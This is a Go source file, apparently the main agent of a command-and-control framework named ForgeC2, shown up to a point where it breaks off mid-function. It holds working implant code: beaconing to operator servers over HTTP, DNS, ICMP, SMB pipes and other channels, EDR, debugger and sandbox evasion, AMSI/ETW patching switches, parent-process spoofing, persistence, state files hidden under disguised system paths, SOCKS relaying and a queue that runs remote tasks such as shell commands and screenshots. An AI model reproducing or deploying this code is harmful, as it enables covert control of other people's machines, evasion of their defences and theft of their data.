//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"bytes"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	mathRand "math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/forgec2/forgec2/pkg/encoding"
	"github.com/forgec2/forgec2/pkg/protocol"
)

// encodeBeacon marshals a BeaconRequest using multi-format rotation.
func encodeBeacon(v any) ([]byte, error) {
	return encoding.Marshal(v)
}

// decodeBeacon unmarshals a response into BeaconResponse using multi-format detection.
func decodeBeacon(data []byte, v any) error {
	return encoding.Unmarshal(data, v)
}

func newCryptoRand() *mathRand.Rand {
	seed := make([]byte, 8)
	rand.Read(seed)
	src := mathRand.NewSource(int64(binary.LittleEndian.Uint64(seed)))
	return mathRand.New(src)
}

func init() {
	setDPIAware()
	if InitSleepMask() {
		sleepMaskActive = true
	}

	// Start EDR monitor on init
	startEdrMonitor()

	// Run sandbox detection
	go func() {
		time.Sleep(5 * time.Second) // wait for system to settle
		runSandboxCheck()
	}()

	// Environment classification (async to avoid delaying startup)
	go func() {
		time.Sleep(3 * time.Second)
		envClass, opsProfile := detectEnvironment()
		if opsProfile != nil {
			currentEnvClass = envClass
			currentOpsProfile = opsProfile
			envDetected = true
			if !opsProfile.AllowShell {
				logDebug("[env] Shell commands disabled in this environment")
			}
			if !opsProfile.AllowInjection {
				logDebug("[env] Process injection disabled in this environment")
			}
			if !opsProfile.AllowCredDump {
				logDebug("[env] Credential dumping disabled in this environment")
			}
		}
	}()

	// Apply the injected runtime config block (XOR'd JSON blob) over defaults
	// before any of the string vars are parsed below.
	loadConfigBlob()

	// Parse injected string values ( -X only supports string )
	// Multi-C2 failover: comma-separated URLs in C2URL
	parts := strings.Split(C2URL, ",")
	C2URLs = make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p != "" {
			C2URLs = append(C2URLs, p)
		}
	}
	if len(C2URLs) == 0 {
		C2URLs = []string{C2URL}
	}
	currentC2Idx = 0
	var err error
	Interval, err = strconv.Atoi(IntervalStr)
	if err != nil {
		Interval = 10
	}
	Jitter, err = strconv.Atoi(JitterStr)
	if err != nil {
		Jitter = 20
	}
	Persist = strings.ToLower(PersistStr) == "true" || PersistStr == "1"
	SkipTLSVerify = strings.ToLower(SkipTLSVerifyStr) == "true" || SkipTLSVerifyStr == "1"
	Debug = strings.ToLower(DebugStr) == "true" || DebugStr == "1"
	BeaconURI = BeaconURIStr
	if BeaconURI == "" {
		BeaconURI = "/api/v1/beacon"
	}
	BeaconMethod = "POST" // FORCE POST �?GET with body is unreliable in Go's http client
	BeaconTransport = BeaconTransportStr
	if BeaconTransport == "" {
		BeaconTransport = "http"
	}
	beaconKey = BeaconKeyStr

	// SMB pipe name: use explicit config or extract from C2URL
	smbPipeName = SMBPipeName
	if smbPipeName == "" {
		// Try to extract from C2URL when Protocol is "smb"
		if Protocol == "smb" || strings.HasPrefix(C2URL, "smb://") {
			smbPipeName = strings.TrimPrefix(C2URL, "smb://")
		}
	}
	isSMBParent = strings.ToLower(IsSMBParentStr) == "true" || IsSMBParentStr == "1"

	if Debug {
		fmt.Printf("[DEBUG] BeaconURI=%q BeaconMethod=%q C2URL=%q SMBPipeName=%q\n", BeaconURI, BeaconMethod, C2URL, smbPipeName)
	}
	if id, err := strconv.ParseUint(ListenerIDStr, 10, 32); err == nil {
		ListenerID = uint(id)
	}

	evasionEnabled = strings.ToLower(EvasionStr) == "true" || EvasionStr == "1"
	if v := os.Getenv("FORGEC2_EVASION"); v == "1" || strings.ToLower(v) == "true" {
		evasionEnabled = true
	}

	// Adaptive EDR detection: detect running EDR and apply optimal evasion strategy
	edrInfo := DetectEDR()
	strategy := edrInfo.GetStrategy()
	ApplyStrategy(strategy)
	if edrInfo.Detected && Debug {
		fmt.Printf("[EDR] Detected %s, applied strategy\n", edrInfo.Name)
	}

	// Anti-debug detection: early check before beaconing starts
	if runtime.GOOS == "windows" {
		score, details := AntiDebugCheck()
		antiDebugScore = score
		if score > 20 {
			antiDebugTriggered = true
			logDebugf("[antidebug] Detection score: %d/%d checks triggered", score, len(details))
			if score > 50 {
				enterGhostMode("anti-debug threshold exceeded")
			} else {
				patchAMSI = false
				patchETW = false
			}
		}
		go runAntiDebugMonitor()
	}

	ppidSpoofEnabled = strings.ToLower(PPIDSpoofStr) == "true" || PPIDSpoofStr == "1"
	if v := os.Getenv("FORGEC2_PPID_SPOOF"); v == "1" || strings.ToLower(v) == "true" {
		ppidSpoofEnabled = true
	}

	egressDetection = strings.ToLower(EgressDetectionStr) == "true" || EgressDetectionStr == "1"

	chameleonEnabled = strings.ToLower(ChameleonStr) == "true" || ChameleonStr == "1"
	chameleonProfile = ChameleonProfileStr
	if chameleonProfile == "" {
		chameleonProfile = "random"
	}

	persistencePrefix = PersistencePrefixStr
	if persistencePrefix == "" {
		persistencePrefix = "ForgeC2"
	}
	if v := os.Getenv("FORGEC2_PERSIST_PREFIX"); v != "" {
		persistencePrefix = v
	}

	// Certificate pinning
	initTLSPinning()

	// SSH transport config
	initSSHConfig()

	// mTLS transport config
	initMTLS()

	// WireGuard transport config
	initWG()

	// Initialize CLR (.NET) hosting for in-process assembly execution
	if runtime.GOOS == "windows" {
		useCLRHosting = initCLRHosting()
	}

	// Initialize v2 beacon crypto: persistent identity key + ephemeral ECDH session.
	// v2 has no legacy XOR/plaintext beacon path — encryption is mandatory.
	loadOrCreateIdentityKey()
	sess, err := newECDSession()
	if err == nil {
		ecdhSess = sess
	}

	// Expiry date check: exit if expired
	if ExpiryDateStr != "" {
		kd, err := time.Parse("2006-01-02", ExpiryDateStr)
		if err == nil && time.Now().After(kd) {
			debugLog("Expiry date reached, exiting.")
			os.Exit(0)
		}
	}

	// Parse multi-C2 mode
	switch strings.ToLower(C2ModeStr) {
	case "failover":
		c2Mode = C2ModeFailover
	case "roundrobin", "round_robin":
		c2Mode = C2ModeRoundRobin
	case "random":
		c2Mode = C2ModeRandom
	case "split":
		c2Mode = C2ModeSplit
	case "parallel":
		c2Mode = C2ModeParallel
	default:
		c2Mode = C2ModeSingle
	}

	if mr, err := strconv.Atoi(MaxRetriesStr); err == nil {
		maxRetries = mr
	} else {
		maxRetries = 10
	}

	if dt, err := strconv.Atoi(DeadTimeoutStr); err == nil {
		deadTimeout = time.Duration(dt) * time.Second
	} else {
		deadTimeout = 3600 * time.Second
	}

	c2Stats = make(map[int]*c2FailStats)

	// Parse gossip config
	GossipEnabled = strings.ToLower(GossipEnabledStr) == "true" || GossipEnabledStr == "1"
	if gi, err := strconv.Atoi(GossipIntervalStr); err == nil && gi > 0 {
		GossipInterval = gi
	} else {
		GossipInterval = 30
	}
	// If gossip listen addr not set, derive from P2PListenAddr by incrementing port
	if GossipEnabled && GossipListenAddr == "" && P2PListenAddr != "" {
		if host, portStr, err := net.SplitHostPort(P2PListenAddr); err == nil {
			if port, err := strconv.Atoi(portStr); err == nil {
				GossipListenAddr = fmt.Sprintf("%s:%d", host, port+1)
			}
		}
	}

	// Working hours
	workingStart = WorkingStartStr
	workingEnd = WorkingEndStr
	workingTZ = WorkingTZStr

	// Kill date
	if KillDateStr != "" {
		if kd, err := time.Parse("2006-01-02", KillDateStr); err == nil {
			killDateParsed = kd
		}
	}

	// TLS verification controlled by SkipTLSVerify (injected at build time)
	var tr *http.Transport
	if chameleonEnabled {
		tr = newUTLSTransport()
	} else {
		tr = &http.Transport{
			MaxIdleConns:        10,
			MaxIdleConnsPerHost: 5,
			IdleConnTimeout:     60 * time.Second,
			TLSClientConfig:     newAgentTLSConfig(DomainFront),
		}
	}
	if ProxyStr != "" {
		proxyURL, err := url.Parse(ProxyStr)
		if err == nil {
			tr.Proxy = http.ProxyURL(proxyURL)
		}
	}
	client = &http.Client{
		Transport: tr,
		Timeout:   30 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 3 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
}

func verifySelfIntegrity() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	exePath, err = filepath.EvalSymlinks(exePath)
	if err != nil {
		return
	}
	data, err := os.ReadFile(exePath)
	if err != nil {
		return
	}
	h := sha256.Sum256(data)
	actual := hex.EncodeToString(h[:])
	if actual != SelfCheckSHA256Str {
		os.Exit(1)
	}
}

func main() {
	log.SetFlags(0)
	if !Debug {
		log.SetOutput(io.Discard)
		os.Stdout, _ = os.Open(os.DevNull)
		os.Stderr, _ = os.Open(os.DevNull)
	}

	if SelfCheckSHA256Str != "" {
		verifySelfIntegrity()
	}

	setDPIAware()
	if Debug {
		fmt.Println(s(SForgeC2), "Agent starting...")
	}

	if Persist {
		addPersistence()
	}

	// Sandbox detection ? run once at startup
	detector := NewSandboxDetector()
	result := detector.Detect()
	inSandbox = result.IsSandbox
	if inSandbox {
		logDebugf("Sandbox detected (confidence: %d%%), entering benign mode", result.Confidence)
	}

	// Initial registration / first beacon
	agentUUID = registerOrGetUUID()

	// Protocol state: registration key. v3 uses a per-implant secret compiled
	// into this binary (never the fleet master key); v2 derives from the
	// compiled-in beacon key. Never transmitted; persisted sequence +
	// registered marker so a restart continues the same session timeline.
	agentRegKey = loadAgentRegKey()
	loadBeaconState()

	// Mark as SMB child if using SMB transport
	if Protocol == "smb" || BeaconTransport == "smb" {
		isSMBChild = true
		if Debug {
			fmt.Printf(s(SForgeC2)+" SMB child mode, pipe: %s\n", smbPipeName)
		}
	}

	// Start SMB parent pipe listener if configured
	if isSMBParent && smbPipeName != "" {
		if err := StartSMBParentPipe(smbPipeName); err != nil {
			if Debug {
				fmt.Printf("[!] SMB parent pipe start failed: %v\n", err)
			}
		} else {
			go p2pCleanupStaleChildren()
		}
	}

	// Start P2P parent listener if in parent mode
	if P2PMode != "" && P2PListenAddr != "" {
		go p2pParentListen()
		go p2pCleanupStaleChildren()
		if Debug {
			fmt.Printf(s(SForgeC2)+" P2P parent mode (%s) on %s\n", P2PMode, P2PListenAddr)
		}
	}

	// JIT Beacon Scheduler
	if runtime.GOOS == "windows" {
		getBeaconScheduler()
	}

	// Start gossip protocol for P2P mesh auto-routing
	if GossipEnabled {
		go startGossipProtocol()
		if GossipListenAddr != "" {
			go gossipListen()
			if Debug {
				fmt.Printf(s(SForgeC2)+" Gossip listener on %s\n", GossipListenAddr)
			}
		}
	}

	// Run egress detection on first startup if configured
	if Protocol != "smb" && (BeaconTransport == "auto" || egressDetection) {
		c2Host := extractC2Host()
		ports := parseEgressPorts()
		if Debug {
			fmt.Printf("[egress] Running egress detection against %s ports %v\n", c2Host, ports)
		}
		report := runEgressDetection(c2Host, ports)
		egressReport = report
		egressDetected = true
		if report.Best != "" {
			bestEgressProto = report.Best
			if Debug {
				fmt.Printf("[egress] Best protocol: %s\n", bestEgressProto)
			}
			switch {
			case strings.HasPrefix(bestEgressProto, "tcp/"):
				Protocol = "tcp"
			case bestEgressProto == "dns":
				Protocol = "dns"
			case bestEgressProto == "icmp":
				Protocol = "icmp"
			}
		}
	}

	// Main beacon loop
	startTaskWorker()
	beaconCount := 0
	for {
		// Kill date check: exit if expired
		if !killDateParsed.IsZero() && time.Now().After(killDateParsed) {
			if Debug {
				fmt.Println("[*] Kill date reached, exiting.")
			}
			os.Exit(0)
		}

		// Ghost mode: send final beacon, then sleep
		if isInGhostMode() {
			if !ghostBeaconSent {
				ghostBeaconSent = true
				doBeacon()
			}
			time.Sleep(24 * time.Hour)
			continue
		}

		// Check triggers before beacon (Windows only)
		if runtime.GOOS == "windows" && beaconSched != nil {
			beaconSched.CheckTriggers()
		}

		doBeacon()
		beaconCount++

		// Exponential backoff on consecutive beacon failures
		if beaconConsecutiveFailures > 0 {
			backoffSec := 1 << uint(beaconConsecutiveFailures-1) // 1, 2, 4, 8, 16...
			if backoffSec > 300 {
				backoffSec = 300 // cap at 5 minutes
			}
			// Add jitter: ±25%
			jitterRange := backoffSec / 4
			if jitterRange > 0 {
				backoffSec += int(mathRand.Int31n(int32(2*jitterRange+1))) - jitterRange
			}
			if Debug {
				fmt.Printf("[!] Beacon backoff: sleeping %ds (failures=%d)\n", backoffSec, beaconConsecutiveFailures)
			}
			time.Sleep(time.Duration(backoffSec) * time.Second)
			continue
		}

		// Notify scheduler after beacon
		if runtime.GOOS == "windows" && beaconSched != nil {
			beaconSched.AfterBeacon()
		}

		// Deliver task results immediately instead of waiting a full sleep cycle.
		pendingMu.Lock()
		hasPending := len(pendingResults) > 0 || len(pendingTaskAcks) > 0
		pendingMu.Unlock()
		if hasPending {
			continue
		}

		// Working hours check: if outside working hours, sleep until next window
		if workingStart != "" && workingEnd != "" {
			if !isWithinWorkingHours() {
				sleepDuration := timeUntilNextWindow()
				if Debug {
					fmt.Printf("[working] Outside working hours (%s-%s), sleeping %v\n", workingStart, workingEnd, sleepDuration)
				}
				time.Sleep(sleepDuration)
				continue
			}
		}

		sleepWithJitter()
	}
}

func sleepWithJitter() {
	// Use sleep variator for non-default modes
	mode := getSleepMode()
	if mode != SleepModeDefault && mode != SleepModeInteractive {
		duration := computeSleepDuration()
		if sleepMaskActive {
			sleepWithMask(duration)
			return
		}
		if evasionEnabled {
			sleepObfuscated(duration)
			return
		}
		time.Sleep(duration)
		return
	}

	// Use JIT scheduler on Windows if available
	if runtime.GOOS == "windows" && beaconSched != nil {
		if beaconSched.ShouldBeaconNow() {
			return
		}
		duration := beaconSched.ComputeNext()

		if sleepMaskActive {
			sleepWithMask(duration)
			return
		}
		if evasionEnabled {
			sleepObfuscated(duration)
			return
		}
		time.Sleep(duration)
		return
	}

	// Interval 0 = interactive mode (tight beacon loop for shell/UI).
	if Interval <= 0 {
		d := 200 * time.Millisecond
		if inFastMode.Load() {
			d = 50 * time.Millisecond
		}
		waitForBeaconWake(d)
		return
	}
	baseInterval := Interval
	if inFastMode.Load() {
		baseInterval = FastInterval
	}
	base := time.Duration(baseInterval) * time.Second
	jit := float64(Jitter) / 100.0
	variation := time.Duration(float64(base) * jit * (rng.Float64()*2 - 1))

	// If Sleep Mask is initialized, use encrypted sleep
	if sleepMaskActive {
		sleepWithMask(base + variation)
		return
	}
	if evasionEnabled {
		sleepObfuscated(base + variation)
		return
	}
	waitForBeaconWake(base + variation)
}

func waitForBeaconWake(duration time.Duration) {
	timer := time.NewTimer(duration)
	defer timer.Stop()
	select {
	case <-timer.C:
	case <-beaconWake:
	}
}

func checkFastMode(tasks []Task) {
	inFastMode.Store(false)
	fastTypes := map[string]bool{
		"screenshot": true, "screenshot_window": true, "shell": true, "ps": true,
		"clipboard_get": true, "clipboard_set": true, "find": true, "drives": true,
		"services": true, "beacon_now": true, "ls": true, "read": true,
	}
	for _, task := range tasks {
		if fastTypes[task.Type] {
			inFastMode.Store(true)
			return
		}
	}
}

func registerOrGetUUID() string {
	uuidFile := getUUIDFilePath()
	if data, err := os.ReadFile(uuidFile); err == nil && len(data) > 0 {
		return strings.TrimSpace(string(data))
	}
	// Generate new using crypto/rand (RFC 4122 compliant)
	var buf [16]byte
	if _, err := rand.Read(buf[:]); err == nil {
		buf[6] = (buf[6] & 0x0f) | 0x40 // version 4
		buf[8] = (buf[8] & 0x3f) | 0x80 // variant 10
		newUUID := fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
			buf[0:4], buf[4:6], buf[6:8], buf[8:10], buf[10:16])
		os.WriteFile(uuidFile, []byte(newUUID), 0o600)
		if runtime.GOOS == "windows" {
			setHidden(uuidFile)
		}
		return newUUID
	}
	// Fallback (should never happen)
	newUUID := fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
		rng.Uint32(), rng.Uint32()&0xffff, rng.Uint32()&0xffff|0x4000,
		rng.Uint32()&0x3fff|0x8000, rng.Uint64())
	os.WriteFile(uuidFile, []byte(newUUID), 0o600)
	if runtime.GOOS == "windows" {
		setHidden(uuidFile)
	}
	return newUUID
}

// getUUIDFilePath returns a less-obvious path for UUID persistence.
func getUUIDFilePath() string {
	if runtime.GOOS == "windows" {
		return os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Crypto\\RSA\\S-1-5-21-0-0-0\\machineguid"
	}
	if runtime.GOOS == "darwin" {
		return os.Getenv("HOME") + "/Library/Preferences/.cfprefsd.plist"
	}
	return "/var/lib/dbus/machine-id"
}

// getBeaconStateFilePath returns the persistence path for v2 protocol state
// (frame sequence, registration marker), stored alongside the identity key.
func getBeaconStateFilePath(name string) string {
	return filepath.Join(filepath.Dir(getUUIDFilePath()), name)
}

// loadBeaconState restores the persisted frame sequence and registration
// marker. The sequence must never go backwards or the server (which persists
// last_seq) would reject our frames as replays.
func loadBeaconState() {
	seqMu.Lock()
	defer seqMu.Unlock()
	if data, err := os.ReadFile(getBeaconStateFilePath("beacon.seq")); err == nil {
		if v, err := strconv.ParseUint(strings.TrimSpace(string(data)), 10, 64); err == nil {
			beaconSeq = v
		}
	}
	if data, err := os.ReadFile(getBeaconStateFilePath("registered")); err == nil {
		registered = strings.TrimSpace(string(data)) == "1"
	}
}

// persistBeaconState saves the current frame sequence and registration marker.
func persistBeaconState() {
	seqMu.Lock()
	seq := beaconSeq
	reg := registered
	seqMu.Unlock()
	path := getBeaconStateFilePath("beacon.seq")
	if err := os.WriteFile(path, []byte(strconv.FormatUint(seq, 10)), 0600); err == nil && runtime.GOOS == "windows" {
		setHidden(path)
	}
	if reg {
		rp := getBeaconStateFilePath("registered")
		if err := os.WriteFile(rp, []byte("1"), 0600); err == nil && runtime.GOOS == "windows" {
			setHidden(rp)
		}
	}
}

// nextBeaconSeq allocates the next frame sequence number.
func nextBeaconSeq() uint64 {
	seqMu.Lock()
	defer seqMu.Unlock()
	beaconSeq++
	return beaconSeq
}

func startTaskWorker() {
	taskWorkerOnce.Do(func() {
		go func() {
			for task := range taskQueue {
				result := executeTask(task)
				ensureResultID(&result)
				pendingMu.Lock()
				pendingResults = append(pendingResults, result)
				pendingMu.Unlock()
				inFastMode.Store(true)
				select {
				case beaconWake <- struct{}{}:
				default:
				}
			}
		}()
	})
}

func enqueueTask(task Task) {
	taskQueue <- task
	pendingMu.Lock()
	pendingTaskAcks = append(pendingTaskAcks, task.ID)
	pendingMu.Unlock()
}

func availableTaskCapacity() int {
	return cap(taskQueue) - len(taskQueue)
}

func doBeacon() {
	info := getSystemInfo()

	// Collect pending SOCKS relay data
	socksData := socksCollectOutbound()
	if len(socksData) > 0 {
		inFastMode.Store(true) // fast poll while SOCKS is active
	}

	// Collect rportfwd data alongside SOCKS frames
	rpfData := rportfwdCollectOutbound()
	if len(rpfData) > 0 {
		socksData = append(socksData, rpfData...)
		inFastMode.Store(true)
	}

	// Collect P2P child results to relay
	p2pRelayMu.Lock()
	relayedResults := make([]RelayedData, 0)
	for _, childUUID := range p2pChildUUIDs {
		results := p2pChildResults[childUUID]
		acks := p2pChildAcks[childUUID]
		if len(results) > 0 || len(acks) > 0 {
			relayedResults = append(relayedResults, RelayedData{
				AgentID:    childUUID,
				Results:    results,
				AckTaskIDs: acks,
			})
			delete(p2pChildResults, childUUID)
			delete(p2pChildAcks, childUUID)
		}
	}
	p2pRelayMu.Unlock()

	// Append gossip peer table to results if enabled (throttled)
	if GossipEnabled && time.Since(lastGossipReport) > 30*time.Second {
		peerTableMu.RLock()
		peers := make([]PeerInfo, 0, len(peerTable))
		for _, p := range peerTable {
			peers = append(peers, p)
		}
		peerTableMu.RUnlock()
		if len(peers) > 0 {
			if data, err := json.Marshal(peers); err == nil {
				pendingMu.Lock()
				pendingResults = append(pendingResults, TaskResult{
					Type:   "gossip_discover",
					Output: string(data),
				})
				pendingMu.Unlock()
				lastGossipReport = time.Now()
			}
		}
	}

	pendingMu.Lock()
	resultsCopy := pendingResults
	acksCopy := pendingTaskAcks
	pendingResults = nil // sent
	pendingTaskAcks = nil
	pendingMu.Unlock()

	taskCapacity := availableTaskCapacity()
	req := BeaconRequest{
		UUID:            agentUUID,
		ProtocolVersion: CurrentProtocolVersion,
		AgentVersion:    AgentVersion,
		Info:            info,
		Results:         resultsCopy,
		AckTaskIDs:      acksCopy,
		TaskCapacity:    &taskCapacity,
		SocksData:       socksData,
		Relayed:         relayedResults,
	}

	body, _ := json.Marshal(req)

	// Decide frame type and build the v2 envelope. Encryption failures MUST NOT
	// fall back to plaintext (defeats encryption / leaks beacon data); drop the
	// beacon so the data stays queued for the next attempt.
	sendBody, frameKind, frameSeq, ok := buildBeaconEnvelope(body)
	if !ok {
		if Debug {
			fmt.Printf("[!] Beacon encryption failed, dropping beacon (no plaintext fallback)\n")
		}
		pendingMu.Lock()
		pendingResults = append(resultsCopy, pendingResults...)
		pendingTaskAcks = append(acksCopy, pendingTaskAcks...)
		pendingMu.Unlock()
		beaconConsecutiveFailures++
		return
	}

	// Apply traffic shape analysis and adaptation
	sendBody = applyTrafficShaping(sendBody)

	// P2P child mode: beacon through parent instead of server
	var respBody []byte
	if P2PParent != "" {
		respBody = sendP2PBeacon(sendBody)
	} else if Protocol == "smb" || BeaconTransport == "smb" {
		respBody = sendSMBBeacon(sendBody)
	} else if Protocol == "tcp" {
		respBody = sendTCPBeacon(sendBody)
	} else if Protocol == "dns" {
		respBody = sendDNSBeacon(sendBody)
		if respBody == nil {
			dnsConsecutiveFailures++
			if Debug {
				fmt.Printf("[!] DNS beacon failed (%d/%d consecutive failures)\n", dnsConsecutiveFailures, dnsFallbackThreshold)
			}
			if dnsConsecutiveFailures >= dnsFallbackThreshold {
				if Debug {
					fmt.Println("[!] DNS failure threshold reached, falling back to HTTP")
				}
				Protocol = "http"
				respBody = sendWithMode(sendBody)
			}
		} else {
			dnsConsecutiveFailures = 0
		}
	} else if Protocol == "icmp" {
		respBody = sendICMPBeacon(sendBody)
	} else if BeaconTransport == "wss" {
		respBody = sendWSSBeacon(sendBody)
	} else if BeaconTransport == "grpc" || strings.HasPrefix(C2URLs[currentC2Idx], "grpc://") || strings.HasPrefix(C2URLs[currentC2Idx], "grpcs://") {
		respBody = sendGRPCBeacon(sendBody)
	} else if BeaconTransport == "ssh" || strings.HasPrefix(C2URLs[currentC2Idx], "ssh://") {
		respBody = sendSSHBeacon(sendBody)
	} else if BeaconTransport == "mtls" || strings.HasPrefix(C2URLs[currentC2Idx], "mtls://") {
		respBody = sendMTLSBeacon(sendBody)
	} else if BeaconTransport == "h2c" || strings.HasPrefix(C2URLs[currentC2Idx], "h2c://") {
		respBody = sendH2CBeacon(sendBody)
	} else if BeaconTransport == "wg" || strings.HasPrefix(C2URLs[currentC2Idx], "wg://") {
		respBody = sendWGBeacon(sendBody)
	} else {
		respBody = sendWithMode(sendBody)
	}
	if respBody == nil {
		pendingMu.Lock()
		pendingResults = append(resultsCopy, pendingResults...)
		pendingTaskAcks = append(acksCopy, pendingTaskAcks...)
		pendingMu.Unlock()
		// If the server rejected/never saw the frame and our persisted sequence
		// was lost, jump the counter once per failure streak so a stale local
		// seq can't lock us into permanent replay rejection.
		if beaconConsecutiveFailures == 0 {
			seqMu.Lock()
			beaconSeq += 1000
			seqMu.Unlock()
		}
		beaconConsecutiveFailures++
		if Debug {
			fmt.Printf("[!] Beacon returned nil, consecutive failures: %d\n", beaconConsecutiveFailures)
		}
		return
	}

	beaconConsecutiveFailures = 0

	// Parse response. The frame type determines the expected response shape:
	// auth frames get a plaintext envelope, encrypted frames get {"c": ...}.
	var resp BeaconResponse
	switch frameKind {
	case agentFrameRegister, agentFrameHandshake:
		var authResp struct {
			Seq     uint64 `json:"seq"`
			RegOK   bool   `json:"reg_ok"`
			ECDHPub string `json:"ecdh_pub"`
			Mac     string `json:"mac"`
		}
		if err := json.Unmarshal(respBody, &authResp); err != nil {
			if Debug {
				log.Printf("[!] Failed to parse auth response: %v", err)
			}
			// Server rejected the frame (e.g. already registered): fall back to
			// the handshake path which works for any registered agent.
			if frameKind == agentFrameRegister {
				seqMu.Lock()
				registered = true
				seqMu.Unlock()
				persistBeaconState()
				inFastMode.Store(true)
			}
			return
		}
		// Authenticate the server's public key before trusting it.
		if !verifyResponseMAC(authResp.Seq, authResp.ECDHPub, authResp.Mac) {
			if Debug {
				log.Printf("[!] Auth response MAC mismatch, aborting")
			}
			return
		}
		if err := ecdhSess.establishFromServerKey(authResp.ECDHPub); err != nil {
			if Debug {
				log.Printf("[!] ECDH handshake completion failed: %v", err)
			}
			return
		}
		if authResp.RegOK {
			seqMu.Lock()
			registered = true
			seqMu.Unlock()
			persistBeaconState()
		}
		seqMu.Lock()
		rekeyRequested = false
		seqMu.Unlock()
		// Re-beacon immediately with the encrypted payload.
		inFastMode.Store(true)
		return
	case agentFrameEncrypted:
		var env struct {
			CipherB64 string `json:"c"`
		}
		if err := json.Unmarshal(respBody, &env); err != nil {
			return
		}
		if env.CipherB64 == "" {
			return
		}
		aad := []byte(agentUUID + "\x00" + strconv.FormatUint(frameSeq, 10))
		plaintext, err := ecdhSess.decryptAESGCMWithAAD(env.CipherB64, aad)
		if err != nil {
			// Server restarted or rekeyed: drop the session so the next beacon
			// performs a fresh authenticated handshake.
			if Debug {
				log.Printf("[!] ECDH decrypt failed: %v", err)
			}
			ecdhSess.invalidate()
			inFastMode.Store(true)
			return
		}
		if err := decodeBeacon(plaintext, &resp); err != nil {
			return
		}
		if resp.Rekey {
			seqMu.Lock()
			rekeyRequested = true
			seqMu.Unlock()
			ecdhSess.invalidate()
		}
	default:
		return
	}

	// Fleet kill-switch broadcast: verify and obey before processing anything
	// else (tasks, SOCKS, relayed frames).
	if resp.KillSwitch != "" || resp.KillSwitchMAC != "" {
		if verifyKillSwitch(resp.KillSwitch, resp.KillSwitchMAC) {
			engageKillSwitch()
		} else if Debug {
			log.Printf("[!] Ignoring invalid kill-switch broadcast (token mismatch)")
		}
	}

	// Process SOCKS relay frames from server (before tasks, so connect arrives first)
	if len(resp.SocksFrames) > 0 {
		socksProcessFrames(resp.SocksFrames)
	}

	// Distribute relayed tasks to P2P children
	if len(resp.Relayed) > 0 {
		p2pRelayMu.Lock()
		for _, rt := range resp.Relayed {
			p2pChildTasks[rt.AgentID] = append(p2pChildTasks[rt.AgentID], rt.Tasks...)
		}
		p2pRelayMu.Unlock()
	}

	// checkFastMode resets inFastMode, so we set SOCKS hints AFTER it
	checkFastMode(resp.Tasks)

	// SOCKS fast mode overrides (after checkFastMode's reset)
	if resp.SocksFastMode || len(resp.SocksFrames) > 0 || socksRelayFast {
		inFastMode.Store(true)
	}
	socksRelayMu.Lock()
	if len(socksRelayConns) > 0 {
		inFastMode.Store(true)
	}
	socksRelayMu.Unlock()

	for _, task := range resp.Tasks {
		enqueueTask(task)
	}
}

func sendToC2(idx int, body []byte) []byte {
	if idx < 0 || idx >= len(C2URLs) {
		return nil
	}
	url := C2URLs[idx]

	beaconURI := BeaconURI
	if ContentLengthJitter > 0 {
		beaconURI = addRandomParam(beaconURI)
	}

	req, err := http.NewRequest("POST", url+beaconURI, bytes.NewReader(body))
	if err != nil {
		return nil
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", UserAgent)

	if DomainFront != "" {
		req.Host = DomainFront
	}

	resp, err := client.Do(req)
	if err != nil {
		if Debug {
			fmt.Printf("[!] Beacon to %s failed: %v\n", url, err)
		}
		return nil
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		if Debug {
			fmt.Printf("[!] %s returned %d\n", url, resp.StatusCode)
		}
		return nil
	}

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}
	if Debug {
		fmt.Printf("[+] Beacon OK from %s, response %d bytes\n", url, len(data))
	}
	// The server's malleable profile may wrap the JSON reply with fixed
	// prepend/append bytes. Strip them here (HTTP transport only) so the
	// JSON envelope below parses; binary transports never wrap the frame.
	data = stripMalleableWrapping(data)
	return data
}

// stripMalleableWrapping removes the configured malleable prepend/append
// padding from an HTTP beacon response body. The server prepends/appends the
// exact strings configured in its malleable profile; stripping must be
// symmetrical or the JSON decoder rejects the reply.
func stripMalleableWrapping(data []byte) []byte {
	switch {
	case MalleablePrepend == "" && MalleableAppend == "":
		return data
	case MalleablePrepend == "":
		return bytes.TrimSuffix(data, []byte(MalleableAppend))
	case MalleableAppend == "":
		return bytes.TrimPrefix(data, []byte(MalleablePrepend))
	default:
		data = bytes.TrimPrefix(data, []byte(MalleablePrepend))
		return bytes.TrimSuffix(data, []byte(MalleableAppend))
	}
}

func sendBeacon(body []byte) []byte {
	startIdx := currentC2Idx
	for i := 0; i < len(C2URLs); i++ {
		idx := (startIdx + i) % len(C2URLs)
		data := sendToC2(idx, body)
		if data != nil {
			currentC2Idx = idx
			return data
		}
	}
	return nil
}

// sendTCPBeacon implements the TCP transport using length-prefixed JSON framing.
// C2URL should be host:port (or tcp://host:port) when Protocol=="tcp".
func sendTCPBeacon(body []byte) []byte {
	addr := strings.TrimPrefix(C2URL, "tcp://")
	addr = strings.TrimPrefix(addr, "tls://")

	var conn net.Conn
	var err error

	// Basic TLS support when SkipTLSVerify or using tls:// scheme
	useTLS := SkipTLSVerify || strings.HasPrefix(C2URL, "tls://")
	if useTLS {
		tlsCfg := newAgentTLSConfig(DomainFront)
		conn, err = tls.Dial("tcp", addr, tlsCfg)
	} else {
		conn, err = net.Dial("tcp", addr)
	}
	if err != nil {
		if Debug {
			fmt.Printf("[!] TCP beacon dial failed: %v\n", err)
		}
		return nil
	}
	defer conn.Close()

	// Write length (BE) + body
	if err := binary.Write(conn, binary.BigEndian, uint32(len(body))); err != nil {
		return nil
	}
	if _, err := conn.Write(body); err != nil {
		return nil
	}

	// Read response length
	var rlen uint32
